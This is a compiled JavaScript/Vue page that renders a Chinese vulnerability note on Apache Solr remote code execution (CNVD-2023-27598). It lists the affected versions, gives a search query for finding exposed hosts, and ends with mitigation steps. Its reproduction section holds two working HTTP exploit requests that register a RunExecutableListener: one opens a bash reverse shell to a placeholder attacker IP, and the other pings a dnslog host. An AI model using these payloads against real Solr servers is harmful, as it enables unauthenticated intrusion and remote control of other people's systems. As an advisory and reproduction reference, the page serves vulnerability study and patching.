import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as r,c as s,a as e,b as t,d as n,e as l}from"./app-58e4a7d6.js";const u={},d=l(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Solr 以 Solrcloud 模式启动且可出网时，未经身份验证的远程攻击者可以通过发送特制的数据包进行利用，最终在目标系统上远程执行任意代码。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>8.10.0 &lt;= Apache Solr &lt; 9.2.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;APACHE-Solr&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>使用postCommit来命令执行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /solr/demo/config HTTP/1.1
Host: 192.168.1.92:8983
Content-Length: 180
Content-Type: application/json

{&quot;add-listener&quot;:{&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;suiyi&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;bash&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/your-ip/9999 0&gt;&amp;1&quot;]}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通过newSearcher命令执行</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /solr/demo/config HTTP/1.1
Host: 192.168.1.92:8983
Content-Length: 170
Content-Type: application/json

{&quot;add-listener&quot;:{&quot;event&quot;:&quot;newSearcher&quot;,&quot;name&quot;:&quot;newSearcher3&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;ping -c 3 your-dnslog.dnslog.cn&quot;]}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2>`,12),c={href:"https://lucene.apache.org/solr/guide/8_6/configsets-api.html",target:"_blank",rel:"noopener noreferrer"},h={href:"https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plugins.html",target:"_blank",rel:"noopener noreferrer"},p={href:"https://github.com/apache/solr/releases/tag/releases/solr/9.2.0",target:"_blank",rel:"noopener noreferrer"};function q(m,v){const a=i("ExternalLinkIcon");return r(),s("div",null,[d,e("ol",null,[e("li",null,[t("如果未使用 ConfigSets API，请禁用 UPLOAD 命令，将系统属性：configset.upload.enabled 设置为 false ，详细参考："),e("a",c,[t("https://lucene.apache.org/solr/guide/8_6/configsets-api.html"),n(a)])]),e("li",null,[t("使用身份验证/授权，详细参考："),e("a",h,[t("https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plugins.html"),n(a)])]),e("li",null,[t("官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本： "),e("a",p,[t("https://github.com/apache/solr/releases/tag/releases/solr/9.2.0"),n(a)])])])])}const _=o(u,[["render",q],["__file","Apache Solr 代码执行漏洞 CNVD-2023-27598.html.vue"]]);export{_ as default};
